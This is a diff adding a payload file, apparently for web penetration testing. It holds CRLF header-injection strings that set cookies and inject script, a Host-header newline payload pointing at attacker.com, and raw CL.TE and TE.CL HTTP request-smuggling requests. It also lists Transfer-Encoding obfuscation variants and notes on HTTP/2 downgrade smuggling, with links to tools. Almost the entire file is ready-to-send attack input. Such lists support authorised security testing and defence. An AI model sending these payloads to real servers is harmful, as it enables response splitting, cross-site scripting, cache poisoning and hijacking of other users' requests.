@@ -1,0 +1,51 @@
+# CRLF injection & HTTP request smuggling payloads.
+# Smuggling is high-risk; confirm target is behind a front-end (CDN/proxy/LB) before testing.
+
+## CRLF_HEADER_INJECTION
+param=value%0d%0aX-Injected-Header:attack
+param=value%0aSet-Cookie:admin=true
+param=value%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
+
+## HOST_HEADER_NEWLINE (Cloudflare HackerOne pattern)
+Host: target.com\r\nX-Forwarded-Host: attacker.com
+
+## CL_TE_SMUGGLING
+# Front-end uses Content-Length; back-end uses Transfer-Encoding.
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+
+## TE_CL_SMUGGLING
+# Front-end uses Transfer-Encoding; back-end uses Content-Length.
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+
+
+## TE_TE_OBFUSCATION
+# Both use TE but one is confused by an obfuscated header.
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-Encoding : chunked
+Transfer-Encoding: xchunked
+Transfer-Encoding:[tab]chunked
+[space]Transfer-Encoding: chunked
+
+## HTTP_2_DOWNGRADE
+# H2.CL / H2.TE — modern smuggling vector on HTTP/2 front-ends.
+# Use: curl --http2 with custom headers, or Turbo Intruder with request smuggling extension.
+# Key marker: inconsistent Content-Length vs body length after h2->h1 downgrade.
+
+## TOOLS
+# https://github.com/PortSwigger/http-request-smuggler (Burp extension)
+# smuggler.py: https://github.com/defparam/smuggler
